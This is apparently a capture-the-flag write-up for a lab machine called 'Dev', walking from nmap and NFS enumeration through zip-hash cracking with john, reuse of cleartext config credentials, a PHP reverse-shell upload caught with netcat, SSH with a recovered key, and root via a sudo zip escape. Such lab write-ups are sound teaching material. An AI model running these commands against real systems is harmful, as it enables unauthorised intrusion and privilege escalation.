# CTF - Dev

## Scanning and Enumeration

### 1. Nmap scan to discover victim

	sudo nmap -sn 192.168.100.1/24

Result : [discovery-scan](https://github.com/hussain2802/ctf-writeups/blob/main/tcm/dev/discovery-scan)
Target IP : 192.168.100.219

### 2. Scanning Target IP

	sudo nmap -A -sC -sV 192.168.100.219

Result : ./nmap-initial

#### Open Ports: 

- 22/tcp ssh v: OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
- 80/tcp http v: Apache httpd 2.4.38 ((Debian))
- 111/tcp rpcbind v: 2-4 (RPC #100000)
- 2049/tcp nfs_acl v: 3 (RPC #100227)
- 8080/tcp http v: Apache httpd 2.4.38 ((Debian))

#### Operating System

Device type: general purpose

Running: Linux 4.X|5.X

OS CPE: cpe:/o:linux:linux_kernel:4 

cpe:/o:linux:linux_kernel:5

OS details: Linux 4.15 - 5.6

Debian

### 3. NFS Enumeration

- Using Nmap to enumerate NFS through its default NSE scripts.

		$>> sudo nmap -p111 --script=nfs* 192.168.100.219
		
		Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-10 19:52 PKT
		Nmap scan report for 192.168.100.219
		Host is up (0.099s latency).

		PORT    STATE SERVICE
		111/tcp open  rpcbind
		| nfs-ls: Volume /srv/nfs
		|   access: Read Lookup Modify Extend Delete NoExecute
		| PERMISSION  UID    GID    SIZE  TIME                 FILENAME
		| rwxr-xr-x   65534  65534  4096  2022-02-10T04:39:39  .
		| ??????????  ?      ?      ?     ?                    ..
		| rw-r--r--   65534  65534  477   2022-02-10T04:38:41  hash
		| rwxr--r--   65534  65534  1876  2021-06-02T09:16:26  id_rsa
		| rw-r--r--   0      0      1911  2021-06-02T09:23:32  save.zip
		| rw-r--r--   65534  65534  164   2021-06-02T09:21:02  todo.txt
		|_
		| nfs-statfs: 
		|   Filesystem  1K-blocks  Used       Available  Use%  Maxfilesize  Maxlink
		|_  /srv/nfs    7205476.0  1859504.0  4960232.0  28%   16.0T        32000
		| nfs-showmount: 
		|_  /srv/nfs 172.16.0.0/12 10.0.0.0/8 192.168.0.0/16
		MAC Address: 50:3E:AA:20:11:4B (Tp-link Technologies)

		Nmap done: 1 IP address (1 host up) scanned in 0.94 seconds


- The above script runs all three scripts on this server.
- What interesting is we found a share open and in it we have 'id_rsa' which is the private key for ssh.

- To confirm the mount share, we can use another tool called 'showmount' to print out the exported share.

		$>> showmount -e 192.168.100.219
		Export list for 192.168.100.219:
		/srv/nfs 172.16.0.0/12,10.0.0.0/8,192.168.0.0/16

- This command list all the exports.

### 4. Mounting the share

- Creating a directory locally to mount the share on.

		$>> mkdir /tmp/mount

- Mounting the share on.

		$>> sudo mount -t nfs 192.168.100.219:/srv/nfs /tmp/mount/ -o nolock

- This will mount the share on local system directory.

- In /tmp/mount/ directory you will find 'save.zip' file.

		┌─[whoami@parrot]─[/tmp/mount]
		└──╼ $ls
		save.zip

### 5. unzip and cracking hash

- The file 'save.zip' has root privileges.
- As you control over your local system, 'su' to login as root.

- Use 'unzip' to extract the file, but it needs the password.

		┌─[root@parrot]─[/tmp/mount]
		└──╼ #unzip save.zip 
		Archive:  save.zip
		[save.zip] id_rsa password: 
			skipping: id_rsa                  incorrect password
			skipping: todo.txt                incorrect password


- Use 'zip2john' utility to calculate the password hash of the 'save.zip'.

		#>> zip2john save.zip > hash

- crack the hash file using 'john' tool.

		#>> john hash

Dump: ./mount_files/crackdump
Password: java101

- unzip the .zip file with password cracked.

		┌─[root@parrot]─[/tmp/mount]
		└──╼ #unzip save.zip 
		Archive:  save.zip
		[save.zip] id_rsa password: 
			inflating: id_rsa                  
			inflating: todo.txt                
		┌─[root@parrot]─[/tmp/mount]
		└──╼ #ls
		dump  hash  id_rsa  save.zip  todo.txt

- 'id_rsa' and 'todo.txt' are files that got extracted.

### 6. SSH in the machine(FAIL;)

- Interesting find is the 'id_rsa' file.
- It acts as private key to connect remotelly over ssh.
- unfortunately connection wasn't succesfull, it kept asking for the password.

### 7. Discovering Directories

- From above Nmap scan we find two http ports open.
	1. Port 80
	2. Port 8080

#### Port 80

- The page itself is an Installation Error Page.
- Directory bursting

		$>> gobuster dir -u 192.168.100.219 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt

Results: ./80-directory-burst1
Directories: 	

/public    
/src                  
/extensions
/app 
/vendor

#### Port 8080

- The page gives out default php info. 
- Directory bursting

		$>> gobuster dir -u http://192.168.100.219:8080/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt

Result: ./8080-directory-burst1
Directories: 	

/dev

### 8. Navigating

#### Port 80

- We gave 5 directories available for it.
- '/src', '/app' and '/vendor' are available as 'Index of /' format to navigate through some inportant config files.

./80-app-index.png
./80-src-index.png
./80-vendor-index.png

#### Port 8080

- '/dev' is available which navigates us directly to the main page of the website.
- It requires admin privileges to allow us go through the pages in detail.
- Registerd an account yet no luck.

### 9. Logging as Admin

- Looked through all the availble config files on Port 80 hosted webapp.
- Found two files with mysql credentials in clear text.

1. http://192.168.100.219/app/cache/config-cache.json

./port80-sql-login-creds1.png

2. http://192.168.100.219/app/config/config.yml

./port80-sql-login-creds2.png

Credentials: bolt:I_love_java

- Used these creds to login on port 8080 hosted webapp. It didn't at first.
- I used the same password but with admin username. IT WORKEDD!!

WebApp creds: admin:I_love_java

### 10. Edit config and upload a reverse shell

- As I naviagete to the site tab, I see various configuration files and categories, listed on right.
- I can edit those files clicking on the edit tab above after electing which file.
- Whhat interests me was 'Config' file.

./edit-config.png

- In this file i added php extension in 'uploadFileTypes' property and saved it.
	
		uploadFileTypes: pdf,txt,php

- Now a place to upload the payload.
- I went to the 'Actions' category on right, scroll down to find 'Upload'.
- It redirected to the upload source code page.
- I removed the '&action=source' part from the link and the upload page loaded.

./upload-shell.png

- Selected and uploaded the reverse php shell file succesfully.

### 11. Bursting Directories

- To find where the files are stored, we can use gobuster to discover directories.

		$sudo gobuster dir -u http://192.168.100.219:8080/dev/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -x php

Result: ./8080-directory-burst2
Directories: 	

/index.php
/pages
/files
/config               
/forms


### 12. Getting a reverse shell

- In '/files' you can find the uploaded payload, before you run it set up a natcat listener on your attacker machine with the port number u specified  before inside the webshell.

./files-upload.png

	$>> nc -lvnp 1234
	Listening on 0.0.0.0 1234
	Connection received on 192.168.100.227 52646
	Linux dev 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64 GNU/Linux
	 23:25:21 up  1:23,  1 user,  load average: 0.00, 0.00, 0.02
	USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
	root     tty1     -                22:02    1:22m  0.05s  0.03s -bash
	uid=33(www-data) gid=33(www-data) groups=33(www-data)
	/bin/sh: 0: can't access tty; job control turned off
	$ whoami
	www-data

- Run "python3 -c 'import pty;pty.spawn("/bin/bash")'" to make the shell interactive.

### 13. Privilege escalation 

#### To User

- Navigate to '/home' and list users to find 'jeanpaul' as the user.
- We already have a 'id_rsa' file. Use it to ssh into machine as the user.
- Due to the permissions, we can't access the machine.
- For that we 'su' our machine and try it again.
- It requires the passphrase cuz of encryption which is 'I_love_java'.
- We successfully escalated our privileges to User.

		┌─[whoami@parrot]─[~/Desktop/task_machines/dev/mount_files]
		└──╼ $ssh -i id_rsa jeanpaul@192.168.100.227
		The authenticity of host '192.168.100.227 (192.168.100.227)' can't be established.
		ECDSA key fingerprint is SHA256:/1NquaatnjtbmsVsYGW1xivpN3yn7KR8aDD9vsfthI0.
		Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
		Warning: Permanently added '192.168.100.227' (ECDSA) to the list of known hosts.
		@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
		@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
		@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
		Permissions 0777 for 'id_rsa' are too open.
		It is required that your private key files are NOT accessible by others.
		This private key will be ignored.
		Load key "id_rsa": bad permissions
		jeanpaul@192.168.100.227's password: 
		Permission denied, please try again.


		┌─[✗]─[whoami@parrot]─[~/Desktop/task_machines/dev/mount_files]
		└──╼ $su
		Password: 
		┌─[root@parrot]─[/home/whoami/Desktop/task_machines/dev/mount_files]
		└──╼ #ssh -i id_rsa jeanpaul@192.168.100.227
		The authenticity of host '192.168.100.227 (192.168.100.227)' can't be established.
		ECDSA key fingerprint is SHA256:/1NquaatnjtbmsVsYGW1xivpN3yn7KR8aDD9vsfthI0.
		Are you sure you want to continue connecting (yes/no/[fingerprint])? yes 
		Warning: Permanently added '192.168.100.227' (ECDSA) to the list of known hosts.
		Enter passphrase for key 'id_rsa': 
		Linux dev 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

		The programs included with the Debian GNU/Linux system are free software;
		the exact distribution terms for each program are described in the
		individual files in /usr/share/doc/*/copyright.

		Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
		permitted by applicable law.
		Last login: Wed Jun  2 05:25:21 2021 from 192.168.10.31
		jeanpaul@dev:~$ exit
		logout
		Connection to 192.168.100.227 closed.


#### To Root

- We use 'sudo -l' to list user's privileges and allowed commands.

		jeanpaul@dev:~$ sudo -l
		Matching Defaults entries for jeanpaul on dev:
		    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

		User jeanpaul may run the following commands on dev:
		    (root) NOPASSWD: /usr/bin/zip


- zip binary can be run as a root with sudo.
- Navigate to 'https://gtfobins.github.io/gtfobins/zip/' to see how we can escalate our pivileges using these binaries.

./gtfo-zip-sudo-ep.png

	TF=$(mktemp -u)
	sudo zip $TF /etc/hosts -T -TT 'sh #'

- We have escalated our privileges to root.
		
		jeanpaul@dev:~$ sudo zip $TF /etc/hosts -T -TT 'sh #'
		updating: etc/hosts (deflated 31%)
		# id      
		uid=0(root) gid=0(root) groups=0(root)
		# whoami
		root
		# cat /root/flag.txt
		Congratz on rooting this box !
		# 




